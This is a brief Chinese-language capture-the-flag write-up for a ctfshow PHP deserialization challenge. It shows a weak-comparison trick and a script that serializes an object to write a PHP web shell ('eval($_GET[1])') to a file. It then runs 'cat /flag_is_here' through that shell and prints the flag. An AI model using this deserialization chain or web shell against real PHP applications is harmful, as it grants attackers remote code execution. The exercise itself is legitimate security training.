如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法， 则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。利用
file_put_contents函数。
因为是弱比较，发现:
```
<?php
var_dump(0x36d == "877.php");
?>
```
发现为1。
```
<?php
class ctfshowvip{
    public $username;
    public $password;
}
$a = new ctfshowvip();
$a->username = '877.php';
$a->password = '<?php eval($_GET[1]);?>';
echo urlencode(serialize($a));
?>
```
然后访问877.php?1=system('cat /flag_is_here');
flag : ctfshow{90103421-62cf-46f3-8519-7f3b8858da69}